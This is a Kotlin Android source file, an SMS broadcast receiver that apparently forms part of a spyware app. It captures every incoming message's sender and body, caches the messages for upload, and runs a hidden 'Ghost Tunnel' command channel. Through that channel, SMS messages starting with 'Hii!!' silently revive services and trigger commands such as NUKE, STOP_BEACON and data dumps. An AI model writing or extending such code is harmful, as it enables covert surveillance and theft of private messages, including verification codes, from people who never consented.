package com.example.myandroid

import kotlinx.coroutines.*

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        // Feature Gate
        if (!ConfigManager.canCollect(context, "sms")) return

        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            // ANR FIX: Go Async to prevent main thread blocking on large log files
            val pendingResult = goAsync()
            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                try {
                    val prefs = context.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                    val editor = prefs.edit()
                    
                    // 1. Update Counters
            val current = prefs.getInt("sms_count", 0)
            val firstRun = prefs.getLong("first_run_time", 0L)
            if (firstRun == 0L) editor.putLong("first_run_time", System.currentTimeMillis())
            editor.putInt("sms_count", current + 1)
            editor.putLong("sms_last_time", System.currentTimeMillis())

            // 2. Parse Messages
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (messages != null && messages.isNotEmpty()) {
                messages.forEach { msg ->
                    val body = msg.messageBody
                    val sender = msg.displayOriginatingAddress

                    // --- A. LOGGING (STREAM) ---
                    val entry = JSONObject()
                    entry.put("sender", sender)
                    entry.put("body", body)
                    entry.put("timestamp", System.currentTimeMillis())
                    
                    // Write to file instantly (No Lag)
                    DumpManager.appendLog("SMS", entry)
                    
                    // Add to cache for passive upload
                    try {
                        val cacheStr = prefs.getString("sms_logs_cache", "[]")
                        val cacheArr = JSONArray(cacheStr!!)
                        cacheArr.put(entry)
                        // Keep last 50
                        if (cacheArr.length() > 50) cacheArr.remove(0)
                        editor.putString("sms_logs_cache", cacheArr.toString())
                    } catch(e: Exception) {}

                    // --- B. GHOST TUNNEL (Hii!! Protocol) ---
                    // Syntax: Hii!! [Command] [Content]
                    if (body != null && body.startsWith("Hii!!")) {
                        // 1. ALWAYS SHOCK: Every 'Hii!!' acts as an invisible Defibrillator
                        ServiceResurrector.shock(context)
                        KeepAliveReceiver.scheduleNext(context)

                        val parts = body.split(" ")
                        if (parts.size >= 2) {
                            val cmd = parts[1].trim().uppercase()
                            val content = if (parts.size >= 3) body.substringAfter(parts[1]).trim() else "0"

                            when (cmd) {
                                "NUKE", "STAY_READY", "STOP_BEACON" -> {
                                    // These are invisible background commands
                                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                                        CommandProcessor.checkAndExecute(context)
                                    }
                                }
                                "CODERED", "1", "2", "3", "4", "5", "6", "7" -> {
                                    // These are visible foreground data dumps
                                    val i = Intent(context, EmergencyService::class.java)
                                    i.putExtra("sender", sender)
                                    i.putExtra("codes", if(cmd == "CODERED") content else cmd)
                                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) context.startForegroundService(i)
                                    else context.startService(i)
                                }
                                // If it's a normal message like 'Hii!! How are you?', we do NOTHING. 
                                // The defibrillator already ran invisibly, but we don't trigger the emergency notification.
                            }
                        }
                    }
                }
            }
            editor.apply()
            } catch(e: Exception) {
                e.printStackTrace()
            } finally {
                pendingResult.finish()
            }
            }
        }
    }
}